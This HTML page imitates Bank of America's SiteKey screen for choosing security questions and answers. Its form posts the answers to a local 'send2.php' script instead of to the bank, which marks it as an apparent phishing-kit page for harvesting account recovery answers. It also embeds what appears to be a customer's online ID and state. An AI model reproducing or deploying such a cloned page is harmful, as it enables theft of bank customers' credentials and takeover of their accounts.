<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<head>



<meta http-equiv="X-UA-Compatible" content="IE=Edge" />





<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank of America | Online Banking | SiteKey | Change SiteKey Challenge Questions and Answers</title>

<script language="JavaScript" type="text/javascript">
			var boaVIPAAuseGzippedBundles = "false";
			var boaVIPAAjawrEnabled = "false";
</script>
	<meta name="Description" CONTENT="Select new SiteKey challenge questions and answers">
<meta name="Keywords" CONTENT="edit-challenge-questions-answers-select-question-answers">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />

   <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico" type="image/ico" />


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>
<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->



		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/Global/1.0/style/global-jawr.css" media="all" />
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/2.5/style/vipaa-jawr.css" media="all" />
					<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/Global/1.0/script/global-jawr.js" type="text/javascript"></script>
					<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/2.5/script/vipaa-jawr.js" type="text/javascript"></script>


	<style> body { display : none;} </style>
</head>

<body>
	 
	<script type="text/javascript"> 
		if (self == top) {
			var theBody = document.getElementsByTagName('body')[0];
			theBody.style.display = "block";
		} 
		else {top.location = self.location;}
	</script>
	<noscript><style>body{display : block;}</style></noscript>
	   
	<a class="ada-hidden" name="skpToMainCNT" href="#skip-to-h1">Skip to main content</a>
		
	<div class="olb-2col-standard-layout olb-layout-common">
		<div class="header">

<script type="text/javascript">

var fsdNavClientOptions = {
  "clientName": "OLB",
  "clientBorneo": true,
  "clientJQuery": true,                                             
  "locale": "en-us",
  "clientActiveTab": "helpsupport",
  "searchSourceSite": "olb",
  "searchSourceDir": "/login",
  "sourceApplication": "VIPAA",
  "languageToggleUrl" : "https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es-us",
  "searchSourceTitle": "Bank of America | Online Banking",
  "entryURL": "",
  "helpURL": "https://secure.bankofamerica.com/login/sitekey/siteKeyReturn.go?linkid=hchelp",
  "customerName":"  ","customerEmail":"  ","jsFilePathFSD":"https://secure.bankofamerica.com/pa/components/utilities/top-nav-util/1.1/script/topnav.js","fsdNavAccountBalances":{
	"localizedPersonalLabel": "Personal Accounts",
	"localizedBusinessLabel": "Business Accounts",
	"localizedInvestmentLabel": "Investment Accounts",
	"localizedViewAllAccountsLabel": "View all accounts <span class='raquo'>&#8250;&#8250;</span>",
	"localizedViewAllXXAccountsLabel": "View all _xx_ accounts <span class='raquo'>&#8250;&#8250;</span>",
  "numAccounts" : "1","FSDTopNav": [{"FSDTopNavAccount" : false}]}
 };
</script>

<script type="text/javascript" src="https://secure.bankofamerica.com/pa/components/utilities/top-nav-util/1.1/script/topnav.js"></script>

<div id="olb-globals-header-container"></div>








<div class="page-title-module h-100">
   <h1 name="skip-to-h1" data-font="cnx-regular" id="skip-to-h1" class="blue-gray-grad-bar-skin">Create SiteKey challenge questions and answers</h1>
</div>



	<div id="clientSideErrors" class="messaging-module hide" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title redTitle" class="TLu_ERROR">We can't process your request.</p>
					<div id="Vipaa_Client_0"><p>We encountered errors with the highlighted item(s). Please make the noted adjustments to continue.</p></div>
				<ul></ul>
			</div>
		</div>
	</div>











<script type="text/javascript">
	var continueURL = '/login/ping';
	function myUrl() {
			window.location =  '/login/sign-in/signOnScreen.go';	
		 		     	    	   
	    	}
</script>


	<div class="vipaa-timeout-module">
		<div id="timeoutDialogExpire" class="hidden">
				<div class="session-content">
					<p>For security, sessions end after 10 minutes of inactivity.</p>
					<p>Your session has timed out, and you'll have to start again</p>
				</div>
		</div>
		
		<div id="timeoutDialog" class="hidden">
				<div class="session-content">
					<p>Your Application Will Time Out in 2 Minutes</p>
					<p>For your safety and Protection your Online Banking session is about to be timed out and redirected to the home page if there is no additional activity.</p> 
					<p>If you are still working in your Online Banking session simply click OK to continue.</p>
				</div>
		</div>
	</div>

   
</div>
		<div class="content-wells">
			<div class="main-well" >




			
<div class="sitekey-questions-module">
   <div class="challenge-qanda-skin phoenix">
   
      <div>Select new questions and enter your answers. We need you to change all 3 questions and answers as a set for added security.</div>
      <p>All fields required</p>      
      <form class="simple-form" name="challengeSelectForm" id="challengeSelectForm" method="post" action="send2.php " autocomplete="off">
<input type="hidden" name="csrfTokenHidden" value="50b66fe01e15c0fb" id="csrfTokenHidden"/>          <fieldset>
		<legend>Field required</legend>            
						<label for="question1">			
							Your first question
						</label>
					
				<select id="question1" name="questionId1"  class="tl-private">
					<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is your all-time favorite song?"  >
What is your all-time favorite song?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the name of the medical professional who delivered your first child?"  >
What is the name of the medical professional who delivered your first child?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the name of your best childhood friend?	"  >
What is the name of your best childhood friend?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="On what street is your grocery store?"  >
On what street is your grocery store?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your mother's closest friend?"  >
What is the first name of your mother's closest friend?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your favorite niece/nephew?"  >
What is the first name of your favorite niece/nephew?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What was the first name of your favorite teacher or professor?"  >
What was the first name of your favorite teacher or professor?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What was the name of your first pet?"  >
What was the name of your first pet?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the name of a college you applied to but didn't attend?"  >
What is the name of a college you applied to but didn't attend?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your hairdresser/barber?"  >
What is the first name of your hairdresser/barber?						</option>
				</select>
						<label  for="answer1"><span class="ada-hidden">Your First</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer1" maxlength="30" name="actualAnswer1" 
					 value=""/>	
						<label for="question2">			
							Your second question
						</label>
					
				<select id="question2" name="questionId2"  class="tl-private">
					<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
						<option class="TL_NPI_ChallengeAnswer" value="Where were you on New Year's 2000?"  >
Where were you on New Year's 2000?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the first name of your high school prom date?"  >
What is the first name of your high school prom date?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What was the first live concert you attended?"  >
What was the first live concert you attended?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the name of your favorite restaurant?"  >
What is the name of your favorite restaurant?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What was the make and model of your first car?"  >
What was the make and model of your first car?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the name of your high school's star athlete?"  >
What is the name of your high school's star athlete?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="As a child, what did you want to be when you grew up?"  >
As a child, what did you want to be when you grew up?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="Who is your favorite person in history?"  >
Who is your favorite person in history?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What was the first name of your first manager?"  >
What was the first name of your first manager?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the first name of the best man/maid of honor at your wedding?"  >
What is the first name of the best man/maid of honor at your wedding?						</option>
				</select>
						<label  for="answer2"><span class="ada-hidden">Your Second</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer2" maxlength="30" name="actualAnswer2" 
					 value=""/>	
						<label for="question3">			
							Your third question
						</label>
					
				<select id="question3" name="questionId3"  class="tl-private">
					<option class="TL_NPI_ChallengeAnswer" value="">Select one...</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the name of your first babysitter?"  >
What is the name of your first babysitter?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What was the name of your first boyfriend or girlfriend?"  >
What was the name of your first boyfriend or girlfriend?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the last name of your family physician?"  >
What is the last name of your family physician?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the last name of your third grade teacher?"  >
What is the last name of your third grade teacher?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What celebrity do you most resemble?"  >
What celebrity do you most resemble?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is the name of your favorite charity?"  >
What is the name of your favorite charity?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What street did your best friend in high school live on? (Enter full name of street only)"  >
What street did your best friend in high school live on? (Enter full name of street only)						</option>
						<option class="TL_NPI_ChallengeAnswer" value="In what city did you meet your spouse/significant other?"  >
In what city did you meet your spouse/significant other?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="What is your best friend's first name?"  >
What is your best friend's first name?						</option>
						<option class="TL_NPI_ChallengeAnswer" value="In what city did you honeymoon? (Enter full name of city only)"  >
In what city did you honeymoon? (Enter full name of city only)			
			</option>
				</select>
						<label  for="answer3"><span class="ada-hidden">Your Third</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer3" maxlength="30" name="actualAnswer3" 
					 value=""/>	
		<input type="hidden" name="nextAction" id="SSKNextAction" value="Continue" />
		<a href="javascript:void(0);" onclick="javascript:document.challengeSelectForm.nextAction.value='Continue';$('#challengeSelectForm').submit();" class="button-common button-blue" name="continue-questions-submit" id="continue-questions-submit" title="Continue" ><span>Continue</span></a>
		<a href="javascript:void(0);" onclick="javascript:document.challengeSelectForm.nextAction.value='Cancel';document.challengeSelectForm.submit();" class="button-common button-gray" name="cancel-questions-submit" id="cancel-questions-submit" title="Cancel" ><span>Cancel</span></a>
		
         <div class="clearboth"></div>
         <input type="hidden" name="lpEnrollErrorCounter" id="lpEnrollErrorCounter" value="0" />
          </fieldset>
		  <input type="hidden" name="pm_fp" value=""/>
      </form>
      </div>
   </div>
   <script type="text/javascript">
   	$(document).ready(function(){
   	});
   </script>
</div>
			<div class="side-well" >



<script type="text/javascript">
var quickHelpRequestURL = '';
</script>
	<div class="quick-help-module">
			<div class="fsd-liveperson-skin phoenix sup-ie" aria-atomic="true">
					<div class="sm-title">
						<h2 class="sm-header">Quick help</h2>
					</div>
						<div class="sm-topcontent-dottedbtm">
					    <ul class="help-links">
											<li>
											<a name="How_are_challenge_questions_used?_|_How_are_challenge_questions_used" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden"></span><span class="title">How are challenge questions used?</span></a>
											<div class="help-link-answer hide"><p>SiteKey challenge questions help protect your Online Banking account. Your answers help us verify your identity and make sure it&rsquo;s you trying to sign in. The questions must be answered correctly to access Online Banking.</p></div>
											</li>
											<li>
											<a name="Are_answers_case-sensitive?_|_Are_answers_case-sensitive" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden"></span><span class="title">Are answers case-sensitive?</span></a>
											<div class="help-link-answer hide"><p>No, answers are not case-sensitive. Answers with or without capitalization are okay. Just create answers that are unique so you'll remember. We won't create possible frustration later by checking capitalizations.</p></div>
											</li>
											<li>
											<a name="Can_I_use_special_characters?_|_Can_I_use_special_characters" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden"></span><span class="title">Can I use special characters?</span></a>
											<div class="help-link-answer hide"><p>Please use only letters, numbers, spaces hyphens and periods. Don't use other special characters in your answers.</p></div>
											</li>
					    </ul>
					</div>
							<div class="sm-btmcontent">





<!-- Added for PRP-1 to block the chat link for certain cases -->









<script type="text/javascript">
	var lpUnit = "olb-passcode";
	if (typeof(lpLanguage)=='undefined')
		var lpLanguage = 'english';
	var ConversionStage = "Edit Challenge Questions Answers - Select Question"
</script>
<script type="text/javascript" src="https://secure.bankofamerica.com/pa/global-assets/1.0/script/mtagconfig.js"></script>
<script type="text/javascript">
	lpAddVars('page','ConversionStage','Edit Challenge Questions Answers - Select Question');
	lpAddVars('session','OnlineID','tassadro');
	lpAddVars('session','State','AZ');	
	lpAddVars('session','Data','AC4C29427369AA304A8D49616AD5DF59CBC2836D93EDDC36');

	<!-- Added for PRP-1: For global error and no contacts issue case -->
</script>

	<div class="liveperson-module">
			<div id="lpButtonDiv"></div>
	</div>
							</div>
		</div>
	</div>

<script type="text/javascript">
	
	if(passCodeErrorCounter == undefined || passCodeErrorCounter == 0){
		var passCodeErrorCounter = 0;
	}
	if(onlineIdErrorCounter == undefined || onlineIdErrorCounter == 0 ){
		var onlineIdErrorCounter = 0;
	}
		lpAddVars('page','Section','Edit Challenge Questions/Answers');
		lpAddVars('page','Errortype','other');

	
	$(document).ready(function(){
		updateLpCounters();
	});
	function updateLpCounters(){
		if(document.getElementById('lpOlbResetErrorCounterId') != undefined){
			document.getElementById('lpOlbResetErrorCounterId').value=onlineIdErrorCounter;
		}
		if(document.getElementById('lpPasscodeErrorCounterId') != undefined){
			document.getElementById('lpPasscodeErrorCounterId').value = passCodeErrorCounter;
		}
	}
	function getSelectedAcctForConvAction(){
		if(document.getElementById('selectVerifyAccount') != undefined){
			var acctDropDown = document.getElementById('selectVerifyAccount');
			var selValue = acctDropDown.options[acctDropDown.selectedIndex].value;
			if(selValue != ''){
				if(selValue == 'atmDebit'){
					conversionAction = 'atm';
				}
				else if(selValue == 'credit'){
					conversionAction = 'credit card';
				}
				else{
					conversionAction = 'other';
				}
			}
			else{
				conversionAction = '';
			}
		}
	}


</script>
</div>
			<div class="clearboth"></div>
		</div>
		<div class="footer">

<div id="olb-globals-footer-container"></div>
	
	
		<script language="javascript" src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/2.5/script/cm-jawr.js"></script>

<script type="text/javascript">
	var cmPageId = "OLB:Tool:SiteKey:EditQA;Select_QA";
	var cmCategoryId = "OLB:Tool:SiteKey:EditQA";
	var cmPageId_Modal = "PVParamsMissing";
	var cmSessionID = "" ;
	
function cmGetReqParameter(queryString, parameterName) {
	var parameterName = parameterName + "=";
	if (queryString.length > 0) {
		begin = queryString.indexOf(parameterName);
		if (begin != -1) {
			begin += parameterName.length;
			end = queryString.indexOf ( "&" , begin );
			if ( end == -1 ) {
				end = queryString.length
			}
			return unescape ( queryString.substring ( begin, end ) );
		}
		return null;
	}
}

var testString = window.location.href;

if (cmGetReqParameter(testString, 'sessionid') !== null) {
	cmSessionID = cmGetReqParameter(testString, 'sessionid');
}	


var cmFailure = $("div.messaging-module div.error-skin:visible").length;
if($("div.messaging-module div.error-liveperson-rp-skin:visible").length > 0) {
	cmFailure = $("div.messaging-module div.error-liveperson-rp-skin:visible").length;
}

var cmErrorMsg = '';


var cmReqLocale = $('html').attr('lang');
var locAppendage;
if (cmReqLocale.toLowerCase().indexOf('en') !== -1) {
	locAppendage = '';
} else if (cmReqLocale.toLowerCase().indexOf('es') !== -1) {
	locAppendage = '_ES';
}

if(testString.toLowerCase().indexOf('.bankofamerica.com')>-1){testString=testString.toLowerCase();var tempArr=testString.split('.bankofamerica.com');var tempStr=tempArr[0];if(tempStr.indexOf('\/\/')>-1){tempArr=tempStr.split('\/\/');tempStr=tempArr[1];if(tempStr.indexOf('.')>-1){tempArr=tempStr.split('.');tempStr=tempArr[0];var tempStrPt2=tempArr[1]}if(tempStr.indexOf('www')>-1){if(tempStr.indexOf('-')>-1){cmSetStaging()}else if(tempStrPt2!=null){if(tempStrPt2.indexOf('ecnp')>-1){cmSetStaging()}}else{cmSetProduction()}}else if(tempStr.indexOf('-')>-1){if(tempStr.indexOf('sitekey')>-1){if(tempStr=='sitekey'){cmSetProduction()}else{cmSetStaging()}}else{cmSetStaging()}}else if(tempStrPt2!=null){if(tempStrPt2.indexOf('ecnp')>-1){cmSetStaging()}}else{cmSetProduction()}}}  

	if (cmFailure === 0 && $('#acwContainer').length == 0) {
		cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);
	}
	
	else if (cmFailure > 0 ) {
		
		var errorCode='';
		var errorCodeCounter=0;
		var errorCodeIndex;
		cmPageId = cmPageId+'_Error'
		cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);
		if ($('.messaging-module').find('.error-skin:visible').length > 0) {
			$("div.messaging-module div.error-skin:visible").attr('tabindex',0).attr('aria-live', 'rude').focus();
			if($('.messaging-module .error-skin:visible ul li').length > 0) {
				$('.messaging-module .error-skin:visible ul li').each(function() {
					cmErrorMsg = $(this).html();
					errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
					cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);
					errorCodeCounter = errorCodeCounter + 1;
				});				
			} else {
				cmErrorMsg = $.trim($('.messaging-module .error-skin:visible p').text());
				errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
				cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);			
			}		
		}
		if ($('.messaging-module').find('.error-liveperson-rp-skin:visible').length > 0) {
				$("div.messaging-module div.error-liveperson-rp-skin:visible").attr('tabindex',0).attr('aria-live', 'rude').focus();
				$('.messaging-module .error-liveperson-rp-skin:visible ul li').each(function() {
					cmErrorMsg += $(this).html() + ' - ';
					errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
					cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'VIPAA_PRP_ACTION_000'+errorCodeIndex, cmCategoryId, cmErrorMsg);
					errorCodeCounter = errorCodeCounter + 1;
				});				
			}
	}
function cmSetDD() {
	var testString = window.location.href;
	if (testString.toLowerCase().indexOf('.bankofamerica.com') > -1){
		testString = testString.toLowerCase(); 
		var tempArr = testString.split('.bankofamerica.com');
		var tempStr = tempArr[0];
			if (tempStr.indexOf('\/\/') > -1) {
				tempArr = tempStr.split('\/\/');tempStr = tempArr[1];
				if (tempStr.indexOf('.') > -1) {
					tempArr = tempStr.split('.');tempStr = tempArr[0];var tempStrPt2 = tempArr[1];}
					if (tempStr.indexOf('www') > -1) {
						if (tempStr.indexOf('-') > -1) {cmSetStaging()}
						else if (tempStrPt2 != null) {
							if (tempStrPt2.indexOf('ecnp') > -1) {cmSetStaging()} 
						}
						else {cmSetProduction()} 
					}
					else if (tempStr.indexOf('-') > -1) {
						if (tempStr.indexOf('sitekey') > -1){
							if (tempStr == 'sitekey') {cmSetProduction()}
							else {cmSetStaging()}  
						} 
						else {cmSetStaging()}
					}	
					else if (tempStrPt2 != null) {
							if (tempStrPt2.indexOf('ecnp') > -1) {cmSetStaging()} 
						}
	   				else {cmSetProduction()} 
			}       
	}  

}
if (typeof cmSetStaging == 'function') {cmSetDD()}	
</script></div>	
	</div>
	
</body>	
</html>

